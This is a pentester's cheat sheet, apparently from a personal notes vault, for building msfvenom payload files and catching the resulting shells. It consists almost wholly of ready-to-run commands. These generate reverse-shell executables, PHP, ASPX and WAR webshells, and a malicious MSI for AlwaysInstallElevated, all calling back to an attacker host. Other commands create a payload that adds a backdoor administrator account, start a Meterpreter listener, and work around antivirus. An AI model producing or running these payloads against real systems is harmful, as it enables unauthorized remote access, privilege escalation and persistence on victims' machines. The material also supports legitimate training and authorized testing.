# 🐚 msfvenom Payloads

> When you need a **payload file** (exe/elf/php/aspx/war/msi) instead of a one-liner — for uploads, service replacement, AlwaysInstallElevated, or a Meterpreter session. Match **arch (x86/x64)**, **OS**, and **format** to the target.

Part of [[Shells]]. Related: [[Reverse & Bind Shells]] · [[File Upload]] · [[Windows Service Exploits]] · [[AlwaysInstallElevated]]

---

## 🧠 THINK
- `LHOST=tun0`, `LPORT=443` (common egress).
- **`shell_reverse_tcp`** = plain shell (works with `nc`); **`meterpreter`** = needs multi/handler.
- Match **format** to the delivery: upload → php/aspx/war; service → exe; MSI → msi.
- Stageless (`_reverse_tcp` with full name) is simpler over `nc`; staged needs a handler.

## 💥 COMMON PAYLOADS
Windows exe (service replace / general):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe
```
Linux elf:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f elf -o shell
```
PHP webshell (upload/LFI):
```bash
msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -o shell.php
```
ASPX (IIS):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f aspx -o shell.aspx
```
WAR (Tomcat):
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f war -o shell.war
```
MSI (AlwaysInstallElevated):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi -o evil.msi
```
Exec-only (add admin, no callback):
```bash
msfvenom -p windows/x64/exec CMD='net user hacker Pass123! /add && net localgroup administrators hacker /add' -f exe -o add.exe
```

## 🎣 CATCH IT
Plain shell → `nc -lvnp 443`. Meterpreter → multi/handler:
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; run"
```

## 🔁 FOUND → NEXT
| NEED | PAYLOAD |
|---|---|
| Upload webshell (PHP) | `-p php/reverse_php -f raw` |
| IIS upload | `-f aspx` |
| Tomcat deploy | `-f war` |
| Service replace / general Win | `-f exe` |
| AlwaysInstallElevated | `-f msi` |
| Linux drop | `-f elf` |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No callback | wrong LHOST/arch/OS/port → [[Reverse Shell Not Connecting]] |
| Defender kills exe | use PS one-liner/LOLBins/evil-winrm; or encode (note: encoders rarely beat modern AV) |
| Meterpreter won't connect | use `shell_reverse_tcp` + `nc` instead; match staged/stageless to handler |
| Wrong arch | switch x86↔x64 to match the target process |

## 📇 CHEAT SHEET
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o s.exe
```
```bash
msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -o s.php
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi -o evil.msi
```
**Kill shot:** pick payload+format for the delivery → deliver → catch (`nc`/handler).
